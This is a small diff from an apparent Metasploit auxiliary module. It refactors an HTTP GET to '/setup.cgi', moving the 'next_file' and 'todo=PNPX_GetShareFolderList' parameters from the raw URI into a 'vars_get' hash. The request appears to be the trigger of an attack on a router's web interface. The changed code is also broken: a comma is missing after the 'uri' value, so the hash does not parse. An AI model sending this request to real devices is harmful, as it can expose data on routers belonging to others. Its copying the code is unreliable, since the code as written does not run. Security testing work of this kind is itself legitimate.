@@ -91,7 +91,11 @@ class MetasploitModule < Msf::Auxiliary
     end
 
     res = send_request_cgi(
-      'uri' => '/setup.cgi?next_file=BRS_swisscom_success.html&x=todo=PNPX_GetShareFolderList',
+      'uri' => '/setup.cgi'
+      'vars_get' => {
+        'next_file' => 'BRS_swisscom_success.html',
+        'x' => 'todo=PNPX_GetShareFolderList',
+      },
       'method' => 'GET'
     )
 
